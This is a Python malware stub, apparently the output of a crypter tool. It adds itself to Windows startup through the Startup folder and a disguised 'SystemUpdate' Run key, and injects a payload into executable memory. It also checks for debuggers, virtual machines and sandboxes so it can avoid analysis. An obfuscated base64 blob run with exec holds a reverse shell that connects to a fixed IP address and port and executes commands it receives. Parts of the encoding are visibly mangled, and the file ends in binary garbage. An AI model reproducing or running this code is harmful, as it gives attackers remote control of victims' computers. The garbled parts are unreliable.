
# Startup Persistence (Windows)
import os
import shutil
import winreg

def add_to_startup():
    try:
        current_file = os.path.abspath(__file__)
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(startup_path, os.path.basename(current_file))
        
        if not os.path.exists(target_path):
            shutil.copy2(current_file, target_path)
            
        # Also add to registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
    except:
        pass

add_to_startup()


# Process Injection Stub
import ctypes
import sys

def inject_payload():
    """Inject payload into current process"""
    try:
        # Allocate memory
        MEM_COMMIT = 0x1000
        PAGE_EXECUTE_READWRITE = 0x40
        
        if sys.platform == 'win32':
            kernel32 = ctypes.windll.kernel32
            payload_bytes = b'#!/usr/bin/env python3\n    _qocfiejv = 9112; _phgjeepr = base64.b64decode("UW5rUFc0b2t3ag==").decode()\n# Windows Reverse Shell Payload\n# Educational purposes only - Use only on systems you own!\n\nimport socket\n    _hcrbiqwx = 9326; _rvpgallw = base64.b64decode("THlxenNJNDRrMQ==").decode()\nimport subprocess\nimport os\nimport json\nimport threading\nimport time\n\nHOST = base64.b64decode("MTkyLjE2OC44LjEwMQ==").decode()\nPORT = 4444\n\ndef send_heartbeat(sock):\n    ""base64.b64decode("U2VuZCBwZXJpb2RpYyBoZWFydGJlYXQ=").decode()"base64.b64decode("CiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgbWVzc2FnZSA9IGpzb24uZHVtcHMoewogICAgICAgICAgICAgICAg").decode()typebase64.b64decode("OiA=").decode()heartbeatbase64.b64decode("LAogICAgICAgICAgICAgICAg").decode()timestampbase64.b64decode("OiB0aW1lLnRpbWUoKQogICAgICAgICAgICB9KQogICAgICAgICAgICBzb2NrLnNlbmQobWVzc2FnZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMzApCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBicmVhawoKZGVmIG1haW4oKToKICAgIHRyeToKICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICAgIHMuY29ubmVjdCgoSE9TVCwgUE9SVCkpCiAgICAgICAgCiAgICAgICAgIyBTdGFydCBoZWFydGJlYXQgdGhyZWFkCiAgICAgICAgaGVhcnRiZWF0X3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbmRfaGVhcnRiZWF0LCBhcmdzPShzLCksIGRhZW1vbj1UcnVlKQogICAgICAgIGhlYXJ0YmVhdF90aHJlYWQuc3RhcnQoKQogICAgICAgIAogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGRhdGEgPSBzLnJlY3YoNDA5NikuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBqc29uLmxvYWRzKGRhdGEpCiAgICAgICAgICAgICAgICBpZiBtZXNzYWdlLmdldCgndHlwZScpID09ICdjb21tYW5kJzoKICAgICAgICAgICAgICAgICAgICBjbWQgPSBtZXNzYWdlLmdldCgnY29tbWFuZCcsICcnKQogICAgICAgICAgICAgICAgICAgIAogICAgX21tdW90b3FjID0gNjg4OTsgX2piYmt2eG10ID0gJ2g4V2RGVkt2ZmQnCiAgICAgICAgICAgICAgICAgICAgIyBFeGVjdXRlIGNvbW1hbmQKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICAgICAgICAgY21kLAogICAgICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLAogICAgICAgICAgICAgICAgICAgICAgICBjYXB0dXJlX291dHB1dD1UcnVlLAogICAgICAgICAgICAgICAgICAgICAgICB0ZXh0PVRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVvdXQ9MTAKICAgIF9paXd3cGJmdyA9IDg5MzU7IF9iamFieHRuaSA9ICdadEZqRml2QWtCJwogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IGpzb24uZHVtcHMoewogICAgICAgICAgICAgICAgICAgICAgICA=").decode()typebase64.b64decode("OiA=").decode()responsebase64.b64decode("LAogICAgICAgICAgICAgICAgICAgICAgICA=").decode()database64.b64decode("OiByZXN1bHQuc3Rkb3V0ICsgcmVzdWx0LnN0ZGVyciwKICAgICAgICAgICAgICAgICAgICAgICAg").decode()returncodebase64.b64decode("OiByZXN1bHQucmV0dXJuY29kZQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgcy5zZW5kKHJlc3BvbnNlLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgZXhjZXB0IGpzb24uSlNPTkRlY29kZUVycm9yOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBlcnJvcl9yZXNwb25zZSA9IGpzb24uZHVtcHMoewogICAgICAgICAgICAgICAgICAgIA==").decode()typebase64.b64decode("OiA=").decode()responsebase64.b64decode("LAogICAgICAgICAgICAgICAgICAgIA==").decode()database64.b64decode("OiBm").decode()Error: {str(e)}base64.b64decode("CiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgcy5zZW5kKGVycm9yX3Jlc3BvbnNlLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgICAgIAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgIGZpbmFsbHk6CiAgICAgICAgcy5jbG9zZSgpCgppZiBfX25hbWVfXyA9PSA=").decode()__main__":\n    main()\n'
            
            # Allocate memory
            mem = kernel32.VirtualAlloc(
                0, len(payload_bytes), MEM_COMMIT, PAGE_EXECUTE_READWRITE
            )
            
            if mem:
                # Write payload to memory
                ctypes.memmove(mem, payload_bytes, len(payload_bytes))
                
                # Create thread to execute
                thread = kernel32.CreateThread(
                    0, 0, mem, 0, 0, 0
                )
                if thread:
                    kernel32.WaitForSingleObject(thread, -1)
    except:
        pass

inject_payload()

#!/usr/bin/env python3
# Polymorphic Stub - Generated by AET Crypter
# Stub ID: Ja1nvado4twqL6Ur
# Generated: 2025-11-16T14:25:58.738452

    sgmtrjhzhevq = 92970
    zmxfszgpjvlp = 55677
    ehbkv = [66, 55, 12]
    efwkfqxo = 28636
    cpoblkeujt = 35881


# Anti-Debugging Techniques
import sys
import os

def check_debugger():
    """Check for debugger presence"""
    try:
        # Check for common debugger processes
        debuggers = ['ollydbg', 'x64dbg', 'windbg', 'ida', 'wireshark', 'fiddler']
        if sys.platform == 'win32':
            import subprocess
            proc_list = subprocess.check_output('tasklist', shell=True).decode().lower()
            for dbg in debuggers:
                if dbg in proc_list:
                    return True
    except:
        pass
    return False

def check_vm():
    """Check for virtual machine"""
    try:
        if sys.platform == 'win32':
            import subprocess
            # Check for VM artifacts
            vm_artifacts = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
            system_info = subprocess.check_output('systeminfo', shell=True).decode().lower()
            for artifact in vm_artifacts:
                if artifact in system_info:
                    return True
    except:
        pass
    return False

def check_sandbox():
    """Check for sandbox environment"""
    try:
        # Check for low resources (sandbox indicator)
        import psutil
        if psutil.cpu_count() < 2:
            return True
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
            return True
    except:
        pass
    return False

# Run checks
if check_debugger() or check_vm() or check_sandbox():
    sys.exit(0)


# Runtime Decryption

import base64, zlib
_qvsqjewv = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwogICAgX3FvY2ZpZWp2ID0gOTExMjsgX3BoZ2plZXByID0gYmFzZTY0LmI2NGRlY29kZSgiVVc1clVGYzBiMnQzYWc9PSIpLmRlY29kZSgpCiMgV2luZG93cyBSZXZlcnNlIFNoZWxsIFBheWxvYWQKIyBFZHVjYXRpb25hbCBwdXJwb3NlcyBvbmx5IC0gVXNlIG9ubHkgb24gc3lzdGVtcyB5b3Ugb3duIQoKaW1wb3J0IHNvY2tldAogICAgX2hjcmJpcXd4ID0gOTMyNjsgX3J2cGdhbGx3ID0gYmFzZTY0LmI2NGRlY29kZSgiVEhseGVuTkpORFJyTVE9PSIpLmRlY29kZSgpCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcwppbXBvcnQganNvbgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCgpIT1NUID0gYmFzZTY0LmI2NGRlY29kZSgiTVRreUxqRTJPQzQ0TGpFd01RPT0iKS5kZWNvZGUoKQpQT1JUID0gNDQ0NAoKZGVmIHNlbmRfaGVhcnRiZWF0KHNvY2spOgogICAgIiJiYXNlNjQuYjY0ZGVjb2RlKCJVMlZ1WkNCd1pYSnBiMlJwWXlCb1pXRnlkR0psWVhRPSIpLmRlY29kZSgpImJhc2U2NC5iNjRkZWNvZGUoIkNpQWdJQ0IzYUdsc1pTQlVjblZsT2dvZ0lDQWdJQ0FnSUhSeWVUb0tJQ0FnSUNBZ0lDQWdJQ0FnYldWemMyRm5aU0E5SUdwemIyNHVaSFZ0Y0hNb2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZyIpLmRlY29kZSgpdHlwZWJhc2U2NC5iNjRkZWNvZGUoIk9pQT0iKS5kZWNvZGUoKWhlYXJ0YmVhdGJhc2U2NC5iNjRkZWNvZGUoIkxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZyIpLmRlY29kZSgpdGltZXN0YW1wYmFzZTY0LmI2NGRlY29kZSgiT2lCMGFXMWxMblJwYldVb0tRb2dJQ0FnSUNBZ0lDQWdJQ0I5S1FvZ0lDQWdJQ0FnSUNBZ0lDQnpiMk5yTG5ObGJtUW9iV1Z6YzJGblpTNWxibU52WkdVb0ozVjBaaTA0SnlrcENpQWdJQ0FnSUNBZ0lDQWdJSFJwYldVdWMyeGxaWEFvTXpBcENpQWdJQ0FnSUNBZ1pYaGpaWEIwT2dvZ0lDQWdJQ0FnSUNBZ0lDQmljbVZoYXdvS1pHVm1JRzFoYVc0b0tUb0tJQ0FnSUhSeWVUb0tJQ0FnSUNBZ0lDQnpJRDBnYzI5amEyVjBMbk52WTJ0bGRDaHpiMk5yWlhRdVFVWmZTVTVGVkN3Z2MyOWphMlYwTGxOUFEwdGZVMVJTUlVGTktRb2dJQ0FnSUNBZ0lITXVZMjl1Ym1WamRDZ29TRTlUVkN3Z1VFOVNWQ2twQ2lBZ0lDQWdJQ0FnQ2lBZ0lDQWdJQ0FnSXlCVGRHRnlkQ0JvWldGeWRHSmxZWFFnZEdoeVpXRmtDaUFnSUNBZ0lDQWdhR1ZoY25SaVpXRjBYM1JvY21WaFpDQTlJSFJvY21WaFpHbHVaeTVVYUhKbFlXUW9kR0Z5WjJWMFBYTmxibVJmYUdWaGNuUmlaV0YwTENCaGNtZHpQU2h6TENrc0lHUmhaVzF2YmoxVWNuVmxLUW9nSUNBZ0lDQWdJR2hsWVhKMFltVmhkRjkwYUhKbFlXUXVjM1JoY25Rb0tRb2dJQ0FnSUNBZ0lBb2dJQ0FnSUNBZ0lIZG9hV3hsSUZSeWRXVTZDaUFnSUNBZ0lDQWdJQ0FnSUdSaGRHRWdQU0J6TG5KbFkzWW9OREE1TmlrdVpHVmpiMlJsS0NkMWRHWXRPQ2NwQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JRzV2ZENCa1lYUmhPZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZbkpsWVdzS0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUhSeWVUb0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHMWxjM05oWjJVZ1BTQnFjMjl1TG14dllXUnpLR1JoZEdFcENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCcFppQnRaWE56WVdkbExtZGxkQ2duZEhsd1pTY3BJRDA5SUNkamIyMXRZVzVrSnpvS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmpiV1FnUFNCdFpYTnpZV2RsTG1kbGRDZ25ZMjl0YldGdVpDY3NJQ2NuS1FvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBb2dJQ0FnWDIxdGRXOTBiM0ZqSUQwZ05qZzRPVHNnWDJwaVltdDJlRzEwSUQwZ0oyZzRWMlJHVmt0MlptUW5DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSXlCRmVHVmpkWFJsSUdOdmJXMWhibVFLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnUFNCemRXSndjbTlqWlhOekxuSjFiaWdLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZMjFrTEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J6YUdWc2JEMVVjblZsTEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JqWVhCMGRYSmxYMjkxZEhCMWREMVVjblZsTEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IwWlhoMFBWUnlkV1VzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSFJwYldWdmRYUTlNVEFLSUNBZ0lGOXBhWGQzY0dKbWR5QTlJRGc1TXpVN0lGOWlhbUZpZUhSdWFTQTlJQ2RhZEVacVJtbDJRV3RDSndvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDa0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCeVpYTndiMjV6WlNBOUlHcHpiMjR1WkhWdGNITW9ld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQT0iKS5kZWNvZGUoKXR5cGViYXNlNjQuYjY0ZGVjb2RlKCJPaUE9IikuZGVjb2RlKClyZXNwb25zZWJhc2U2NC5iNjRkZWNvZGUoIkxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBPSIpLmRlY29kZSgpZGF0YWJhc2U2NC5iNjRkZWNvZGUoIk9pQnlaWE4xYkhRdWMzUmtiM1YwSUNzZ2NtVnpkV3gwTG5OMFpHVnljaXdLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWciKS5kZWNvZGUoKXJldHVybmNvZGViYXNlNjQuYjY0ZGVjb2RlKCJPaUJ5WlhOMWJIUXVjbVYwZFhKdVkyOWtaUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUgwcENpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjeTV6Wlc1a0tISmxjM0J2Ym5ObExtVnVZMjlrWlNnbmRYUm1MVGduS1NrS0lDQWdJQ0FnSUNBZ0lDQWdaWGhqWlhCMElHcHpiMjR1U2xOUFRrUmxZMjlrWlVWeWNtOXlPZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjR0Z6Y3dvZ0lDQWdJQ0FnSUNBZ0lDQmxlR05sY0hRZ1JYaGpaWEIwYVc5dUlHRnpJR1U2Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JsY25KdmNsOXlaWE53YjI1elpTQTlJR3B6YjI0dVpIVnRjSE1vZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBPT0iKS5kZWNvZGUoKXR5cGViYXNlNjQuYjY0ZGVjb2RlKCJPaUE9IikuZGVjb2RlKClyZXNwb25zZWJhc2U2NC5iNjRkZWNvZGUoIkxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQT09IikuZGVjb2RlKClkYXRhYmFzZTY0LmI2NGRlY29kZSgiT2lCbSIpLmRlY29kZSgpRXJyb3I6IHtzdHIoZSl9YmFzZTY0LmI2NGRlY29kZSgiQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0I5S1FvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY3k1elpXNWtLR1Z5Y205eVgzSmxjM0J2Ym5ObExtVnVZMjlrWlNnbmRYUm1MVGduS1NrS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdaWGhqWlhCMElFVjRZMlZ3ZEdsdmJpQmhjeUJsT2dvZ0lDQWdJQ0FnSUhCaGMzTUtJQ0FnSUdacGJtRnNiSGs2Q2lBZ0lDQWdJQ0FnY3k1amJHOXpaU2dwQ2dwcFppQmZYMjVoYldWZlh5QTlQU0E9IikuZGVjb2RlKClfX21haW5fXyI6CiAgICBtYWluKCkK"
_jujngysx = "None"
_qnvbncay = zlib.decompress(base64.b64decode(_qvsqjewv)).decode()
exec(_qnvbncay)

Ü—Û;ŒHY»ÿ¸]åÛÙƒî"ô`µiqâ&ı˙q’P»»ô∑MPyøUB‡,èrÏUMQis°Ë}ã…¢’Ù√ßµàÁú€IOfÀ”"ø8Ù0¢T0laÊ£ª¿TS)≥ﬂí>∞Bä√öS?–~.Æ[EÄ¶XGÜ g7–aóﬁ·¥U33ˆ]˝ïS0™üäC·í—Á˚ê“ìI¢ì…Ôﬁ¥–∫·Oı1h£ﬁ!‰e,C√?5ìuÂ3˝”W+uw≤:'nó,{w#çà|◊E?∑h3•>+ñjjHäºX,Ãj&€Òé|Mc˙+äßº	I»EÉ°ﬂi
œ~{=}âÖÅƒ √